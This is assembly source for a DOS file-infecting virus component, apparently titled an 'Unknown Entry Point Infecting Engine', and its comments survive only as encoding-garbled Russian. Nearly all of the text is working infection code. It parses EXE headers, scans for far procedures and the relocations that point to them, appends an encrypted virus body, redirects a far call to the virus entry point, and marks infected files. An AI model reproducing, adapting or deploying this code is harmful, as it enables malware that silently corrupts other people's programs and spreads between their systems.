   ;   Unknown Entry Point Infecting Engine
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   MZ_sign     equ Header
   PartPage    equ Header+2
   PageCnt     equ Header+4
   RelocCnt    equ Header+6
   HdrSize     equ Header+8
   StackPointer    equ Header+0Eh
   ChekSum     equ Header+12h
   EntryPoint  equ Header+14h

   ;*¥ ãáâ  ¢«¨¢ ¥â ¨¤¥â¨ä¨ª â®à § à ¦¥®áâ¨
   ;eax -   ¢ëå®¤¥ ¨áå®¤®¥ „ â /‚à¥¬ï

   UEPinfect   proc    near

           mov bx,[handle]
           mov ah,3Fh
           mov cx,1Ah
           mov dx,offset Header
           call    DOS

           cmp word ptr [MZ_sign],'ZM'  ;*¥ EXE'è¨ª
           jne ExitUEPInfect

           cmp word ptr [RelocCnt],0    ;*¥â Reloc í«¥¬¥â®¢ -
           je  ExitUEPInfect        ;¥â ¤ «ì¨å ¢ë§®¢®¢


           call    GetFPB
           mov edx,es:[di+11h]   ;edx - RealLen

           mov ax,word ptr [PageCnt] ;*¥ «ì ï ¤«¨  ¡®«ìè¥ § £àã¦ ¥¬®©
           movzx   eax,ax
           shl eax,9
           cmp eax,edx
           jc  ExitUEPInfect     ;‘ªàëâë© Overlay

           mov eax,es:[di+0Dh]       ;‚à¥¬ï/„ â 
           mov dword ptr [TimeDate],eax

           mov word ptr [ProgID],'ZM'

   ;®âì¥¤¥¬    ç «® ª®¤®¢®£® á¥£¬¥â 
           mov bp,word ptr [EntryPoint+2]
           shl ebp,4
           mov dx,word ptr [HdrSize]
           shl dx,4
           movzx   edx,dx
           add ebp,edx

           mov es:[di+15h],ebp

           mov ax,word ptr [EntryPoint+2] ;FileCS
           mov bx,word ptr [StackPointer]
           sub bx,ax
           mov ax,0FFFh
           jnc @temp4
           mov bx,ax  ;BX - áª®«ìª® ¯ à £à ä®¢ ã¦® áç¨â âì ¨§ ä ©« 
   @temp4:                ;*¥ ¡®«ìè¥ 64Š¡
           and bx,ax
   ;‚ë¤¥«¨¬ ¯ ¬ïâì - ¯à¥¤¯®« £ ¥âáï çâ® ¥¥ ¤®áâ â®ç® > 64Š¡
           mov ah,48h
           call    DOS
           jc  ExitUEPinfect

           mov es,ax
   ;—¨â ¥¬ ª®¤®¢ë© á¥£¬¥â ¨§ ä ©« 
           mov cx,bx                                ³
           shl cx,4    ;¢ ¡ ©â å
           push    ds

           push    es  ;DS -   ¢ë¤¥«¥ë© ¡«®ª
           pop ds

           mov bx,cs:[handle]
           mov ah,3Fh
           xor dx,dx
           call    DOS
           pop ds
           mov [LenCode],ax

   ;ˆé¥¬ â®çªã ¢å®¤  ¤«ï ¢¨àãá 
           mov cx,4
           mov word ptr [StartCode],0
   FindUEP:
           push    cx
           call    SearchProc   ;ˆé¥¬ ¤ «ìîî ¯à®æ¥¤ãàã
           pop cx
           jc  ExitUEPInfect
           push    cx
           call    SearchXref   ;ˆé¥¬   ¥¥ à¥«®ª¥©è
           pop cx
           jnc UEPisFound
           dec cx
           jne FindUEP
   FarPRCnotFND:
           jmp ExitUEPinfect  ;*ã ¢®â â®«ìª® ¯ ¬ïâì §àï § ¯®£ ¨«¨...:(
   UEPisFound:
           mov eax,es:[di]
           mov dword ptr [OldReloc],eax ;‘®åà ï¥¬  áâ®ïé¨©  ¤à¥á

   ;“¡ì¥¬ ¢ë¤¥«¥ë© ¡«®ª - Š®¤ ¯à®£¨  ¬ ¡®«ìè¥ ¥ ã¦¥
           mov ah,49h
           call    DOS

   ;„ «¥¥ ¨¤¥â áâ ¤ àâë© Appending

           mov bx,[handle]
           call    GetFPB

           mov eax,es:[di+11h]    ;‚ ª®¥æ

           mov dx,word ptr [PartPage]
           neg dl
           and dx,0Fh
           movzx   edx,dx
           add eax,edx

           mov es:[di+15h],eax
           push    eax  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;„ «¥¥ ¨¤¥â ¢ë§®¢   ä®à¬¨à®¢ ¨¥ Polymorp'a        ³
   ;‡ ¯®«ï¥â LenDecryptor                 ³
   ;*¨è¥¬ ¢¨àãá                        ³
           mov ah,40h              ³
           mov cx,VirLen           ³
           add cx,[LenDecryptor]       ³
           mov dx,offset VirPlace      ³
           call    DOS             ³
                               ³
   ;‘ä®à¬¨àã¥¬ â®çªã ¢å®¤  ¢ ¢¨àãá             ³                   ³
           mov ax,word ptr [HdrSize]       ³
           shl ax,4                ³
           movzx   eax,ax              ³
           pop edx    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
           sub edx,eax
           shr edx,4
           ror edx,16
           mov dx,VirEntryPoint
           push    edx   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                               ³
   ;Žâì¥¤¥¬   ¢ë§®¢ PRC ¢ ä ©«¥               ³
                               ³
           mov ax,[OffsFarCall]        ³
           movzx   eax,ax              ³
           add ebp,eax             ³
           mov es:[di+15h],ebp         ³
   ;*¨è¥¬  èã â®çªã ¢å®¤  á® áâ¥ª             ³
           mov dx,sp               ³
           push    ds              ³
           push    ss              ³
           pop ds              ³
           mov cx,4                ³
           mov ah,40h              ³
           call    DOS             ³
           pop ds              ³
                               ³
           mov ah,68h       ;‘¡à®á¨¬ *ãä¥à  DOS
           call    DOS             ³
                               ³
           pop edx   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   ;*¥à¥ªàë¢ îâáï «¨ ¢¨àãá ¨ áâ¥ª - ?
           ror edx,16
           mov cx,dx
           mov ax,word ptr [StackPointer+2]
           shr ax,4
           inc ax
           sub dx,ax
           sub dx,word ptr [StackPointer]
           jnc NotCross
   ;*¥à¥¬¥áâ¨¬ FileSS §  ¢¨àãá
           add cx,160
           mov word ptr [StackPointer],cx
   NotCross:
   ;‘ª®àà¥ªâ¨àã¥¬ ¤«¨ã ¢ § £®«®¢ª¥
           mov edx,es:[di+11h]   ;edx - RealLen
           mov ax,dx
           and ax,1FFh        ;*®¢ ï ¤«¨  ¢ § £®«®¢ª¥
           mov word ptr [PartPage],ax
           pushf
           shr edx,9
           popf
           jz  @temp
           inc dx
   @temp:
           mov word ptr [PageCnt],dx
           mov word ptr [ChekSum],VrID

           xor eax,eax
           mov es:[di+15h],eax

           mov ah,40h
           mov cx,1Ah
           mov dx,offset Header
           mov bx,[handle]
           call    DOS
           mov ah,68h       ;‘¡à®á¨¬ *ãä¥à  DOS
           call    DOS

           mov eax,12345678h
   TimeDate    equ $-4
           clc
           ret
   ExitUEPInfect:  stc
           ret
   UEPinfect   endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   SearchProc  proc    near
   ;*®¨áª áâ ¤ àâ®© ¤ «ì¥© ¯à®æ¥¤ãàë ¢ ¯¥à¢ëå 64Š¡ ª®¤ 
   ;
   ;  ’¨¯ :    push    bp     ˆ‹ˆ      enter immN,immM
   ;       mov bp,sp             .
   ;        .                .
   ;        .                .
   ;        .                .
   ;       pop bp          leave
   ;       retf [imm8]         retf  imm8
   ;
   ;ES - Scanned programm code
   ;DS - Virus Data

           mov dx,0FFFFh   ;ID çâ® ¯à®æ¥¤ãà  ¥  ©¤¥ 
           mov cx,[LenCode]
           mov [EnterProc],dx
           mov di,[StartCode]
   Scan:
           mov al,es:[di]
           cmp al,55h      ;push BP
           je  pushBP
           cmp al,0C8h     ;enter immN,immM
           je  enterPRC
           cmp al,5Dh      ;pop BP
           je  exitPRC
           cmp al,0C9h     ;leave
           je  exitPRC
   NextScan:
           inc di
           dec cx
           jne Scan
           stc
           retn
   pushBP:
           cmp word ptr es:[di+1],0EC8Bh   ;mov bp,sp
           jne NextScan
   enterPRC:
           mov [EnterProc],di
           jmp NextScan
   exitPRC:
           cmp [EnterProc],dx
           je  NextScan
           mov al,es:[di+1]
           cmp al,0CBh     ;retf
           je  OK
           cmp al,0CAh     ;retf imm8
           je  OK
           mov [EnterProc],dx
           jmp NextScan
   OK:     inc di      ;„«ï ¯®¨áª  á«¥¤ãîé¥©
           mov [StartCode],di
           clc
           ret
   SearchProc  endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   SearchXRef  proc    near
   ;ˆé¥â *¥«®ª¥©è    ©¤¥ãî ¤ «ìîî ¯à®æ¥¤ãàã ¢ ¯¥à¢ëå 64Š¡ ª®¤ 
   ;ES - Scanned programm code
   ;DS - Virus Data

           xor di,di
           mov cx,[LenCode]
           mov ax,word ptr [EntryPoint+2]
           mov dx,[EnterProc]
           mov word ptr [OffsetPRC],dx
           mov word ptr [OffsetPRC+2],ax
   Search:
           cmp byte ptr es:[di],9Ah
           jne NextSearch
   TestXref:
           cmp dword ptr es:[di+1],12345678h
   OffsetPRC   equ $-4
           je  FoundFarCall        ;‘«¥¤ãîé¨© ‘¥£¬¥âë©  ¤à¥á
           inc word ptr [OffsetPRC+2]
           sub word ptr [OffsetPRC],10h
           jnc TestXref

           mov word ptr [OffsetPRC],dx
           mov word ptr [OffsetPRC+2],ax
   NextSearch:
           inc di
           dec cx
           jne Search
           stc
           ret
   FoundFarCall:   inc di
           mov [OffsFarCall],di   ; DI -  ¤à¥á ®¯¥à ¤  ¢ CALL FAR
           clc
           ret
   SearchXRef  endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   GetFPB      proc
   ;‚®§¢à é ¥â ¢ ES:DI  ¤à¥á File Parameter Block
   ;BX - Handle
           push    bx
           push    ax
           mov ax,1220h    ;*®¬¥à ¢å®¤  ¢ SFT
           int 2Fh     ;ES:[di]

           mov bl,es:[di]  ;*®«ãç¨¬ ¡«®ª ®¯¨á ¨ï ä ©« 
           mov ax,1216h    ;es:di
           int 2Fh

           pop ax
           pop bx
           ret
   GetFPB      endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ UEP Engine DATA ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   StartCode   dw  0
   LenCode     dw  0
   EnterProc   dw  0
   OffsFarCall dw  0
   TempHandle  dw  0
   ProgID      dw  'MZ'
   OldReloc    dd  0
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
